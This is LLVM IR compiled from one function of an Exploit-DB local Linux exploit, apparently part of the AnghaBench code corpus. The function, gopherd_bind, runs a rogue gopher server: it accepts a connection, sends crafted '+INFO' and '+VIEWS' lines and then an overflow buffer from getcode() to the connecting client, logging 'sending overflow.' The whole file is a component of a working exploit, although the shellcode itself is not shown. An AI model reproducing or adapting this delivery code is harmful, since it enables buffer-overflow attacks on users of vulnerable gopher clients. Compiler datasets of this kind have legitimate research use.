; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_1187.c_gopherd_bind.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_1187.c_gopherd_bind.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@SOL_SOCKET = common dso_local global i32 0, align 4
@SO_REUSEADDR = common dso_local global i32 0, align 4
@INADDR_ANY = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [37 x i8] c"[*] awaiting connection from: *:%d.\0A\00", align 1
@.str.1 = private unnamed_addr constant [23 x i8] c"could not bind socket.\00", align 1
@.str.2 = private unnamed_addr constant [43 x i8] c"[*] gopher server connection established.\0A\00", align 1
@.str.3 = private unnamed_addr constant [39 x i8] c"[*] waiting for <any> request/data...\0A\00", align 1
@.str.4 = private unnamed_addr constant [46 x i8] c"[*] received request/data, sending overflow.\0A\00", align 1
@.str.5 = private unnamed_addr constant [5 x i8] c"+-1\0A\00", align 1
@.str.6 = private unnamed_addr constant [37 x i8] c"+INFO:\090filler\09filler\09filler\09filler\0A\00", align 1
@.str.7 = private unnamed_addr constant [11 x i8] c"+VIEWS:\09\0A \00", align 1
@BUFSIZE = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.9 = private unnamed_addr constant [38 x i8] c"[*] gopher server connection closed.\0A\00", align 1
@SO_REUSEPORT = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i8* @gopherd_bind(i16 zeroext %0) #0 {
  %2 = alloca i16, align 2
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca [2 x i8], align 1
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  store i16 %0, i16* %2, align 2
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  store i32 1, i32* %5, align 4
  store i32 0, i32* %6, align 4
  %10 = load i32, i32* @AF_INET, align 4
  %11 = load i32, i32* @SOCK_STREAM, align 4
  %12 = load i32, i32* @IPPROTO_TCP, align 4
  %13 = call i32 @socket(i32 %10, i32 %11, i32 %12)
  store i32 %13, i32* %3, align 4
  %14 = load i32, i32* %3, align 4
  %15 = load i32, i32* @SOL_SOCKET, align 4
  %16 = load i32, i32* @SO_REUSEADDR, align 4
  %17 = bitcast i32* %5 to i8*
  %18 = call i32 @setsockopt(i32 %14, i32 %15, i32 %16, i8* %17, i32 4)
  %19 = load i32, i32* @AF_INET, align 4
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  store i32 %19, i32* %20, align 4
  %21 = load i16, i16* %2, align 2
  %22 = call i32 @htons(i16 zeroext %21)
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i32 %22, i32* %23, align 4
  %24 = load i32, i32* @INADDR_ANY, align 4
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  %26 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %25, i32 0, i32 0
  store i32 %24, i32* %26, align 4
  %27 = load i16, i16* %2, align 2
  %28 = zext i16 %27 to i32
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str, i64 0, i64 0), i32 %28)
  %30 = load i32, i32* %3, align 4
  %31 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %32 = call i32 @bind(i32 %30, %struct.sockaddr* %31, i32 12)
  %33 = icmp eq i32 %32, -1
  br i1 %33, label %34, label %36

34:                                               ; preds = %1
  %35 = call i32 @printe(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.1, i64 0, i64 0), i32 1)
  br label %36

36:                                               ; preds = %34, %1
  %37 = load i32, i32* %3, align 4
  %38 = call i32 @listen(i32 %37, i32 1)
  %39 = bitcast %struct.sockaddr_in* %9 to i8*
  %40 = call i32 @bzero(i8* %39, i32 12)
  store i32 12, i32* %6, align 4
  %41 = load i32, i32* %3, align 4
  %42 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %43 = call i32 @accept(i32 %41, %struct.sockaddr* %42, i32* %6)
  store i32 %43, i32* %4, align 4
  %44 = load i32, i32* %3, align 4
  %45 = call i32 @close(i32 %44)
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.2, i64 0, i64 0))
  %47 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.3, i64 0, i64 0))
  %48 = load i32, i32* %4, align 4
  %49 = getelementptr inbounds [2 x i8], [2 x i8]* %7, i64 0, i64 0
  %50 = call i32 @read(i32 %48, i8* %49, i32 1)
  %51 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.4, i64 0, i64 0))
  %52 = load i32, i32* %4, align 4
  %53 = call i32 @write(i32 %52, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i64 0, i64 0), i32 4)
  %54 = load i32, i32* %4, align 4
  %55 = call i32 @write(i32 %54, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.6, i64 0, i64 0), i32 36)
  %56 = load i32, i32* %4, align 4
  %57 = call i32 @write(i32 %56, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.7, i64 0, i64 0), i32 10)
  %58 = load i32, i32* %4, align 4
  %59 = call i8* (...) @getcode()
  %60 = load i32, i32* @BUFSIZE, align 4
  %61 = call i32 @write(i32 %58, i8* %59, i32 %60)
  %62 = load i32, i32* %4, align 4
  %63 = call i32 @write(i32 %62, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.8, i64 0, i64 0), i32 1)
  %64 = call i32 @sleep(i32 1)
  %65 = load i32, i32* %4, align 4
  %66 = call i32 @close(i32 %65)
  %67 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.9, i64 0, i64 0))
  %68 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  %69 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %68, i32 0, i32 0
  %70 = load i32, i32* %69, align 4
  %71 = call i8* @inet_ntoa(i32 %70)
  ret i8* %71
}

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @setsockopt(i32, i32, i32, i8*, i32) #1

declare dso_local i32 @htons(i16 zeroext) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @bind(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @printe(i8*, i32) #1

declare dso_local i32 @listen(i32, i32) #1

declare dso_local i32 @bzero(i8*, i32) #1

declare dso_local i32 @accept(i32, %struct.sockaddr*, i32*) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i8* @getcode(...) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i8* @inet_ntoa(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
